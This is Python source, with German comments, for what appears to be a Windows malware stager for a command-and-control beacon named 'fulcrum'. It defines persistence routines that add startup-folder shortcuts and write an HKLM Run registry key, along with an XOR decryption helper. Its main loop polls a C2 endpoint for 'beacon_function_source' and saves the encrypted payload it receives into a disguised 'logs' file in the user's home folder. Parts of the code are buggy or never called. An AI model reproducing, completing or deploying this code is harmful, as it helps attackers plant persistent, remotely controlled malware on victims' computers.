import os
import winreg
import win32com.client
import shutil
import requests
import time
from cryptography.fernet import Fernet

DEBUG = True
CAC = "http://127.0.0.1:5000"   # command and control server endpoint
PERSONAL_KEY = "your_own_key"  # persönlicher key

def create_shortcut(target_path, shortcut_path):
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.TargetPath = target_path
    shortcut.save()


def add_to_startup_folders(shortcut_path):

    all_users_startup_folder = os.path.join(os.environ["ALLUSERSPROFILE"], "Microsoft", "Windows", "Start Menu", "Programs",
                                      "Startup")
    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs",
                                      "Startup")

    shutil.copy(shortcut_path, startup_folder)
    shutil.copy(all_users_startup_folder, startup_folder)


def add_to_registry_run(target_path):

    key = winreg.HKEY_LOCAL_MACHINE
    key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

    with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
        program_name = os.path.basename(target_path)
        winreg.SetValueEx(reg_key, program_name, 0, winreg.REG_SZ, target_path)

def xor_decrypt(encrypted_text, key):
    repeated_key = (key * (len(encrypted_text) // len(key) + 1))[:len(encrypted_text)]
    decrypted = ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(encrypted_text, repeated_key))
    return decrypted

def main():
    # finden eines geeigneten folders zum speichern von fulcrum
    folders = os.listdir(os.path.expanduser("~"))
    beacon_folder = folders[0]
    beacon_folder_path = os.path.join(os.path.expanduser("~"), beacon_folder)
    if DEBUG:
        print(beacon_folder_path)

    while True:
        try:
            # downloaden von fulcrum
            response = requests.get(CAC + "/beacon_function_source")
            if response.status_code == 200:
                break
            elif DEBUG:
                print("wrong status_code")
        except requests.exceptions.RequestException as e:
            if DEBUG:
                print("Error:\t", e)
        time.sleep(10)

    print(beacon_folder+" logs")
    # erstellen einer datei mit dem namen des gefundenen folders
    with open(os.path.join(beacon_folder_path, beacon_folder+" logs"), "w") as f:
        # speichern des von server bekommenden source code (encrypted)
        response = response.json()
        f.write(response['source'])

        if DEBUG:
            print("saved source")


main()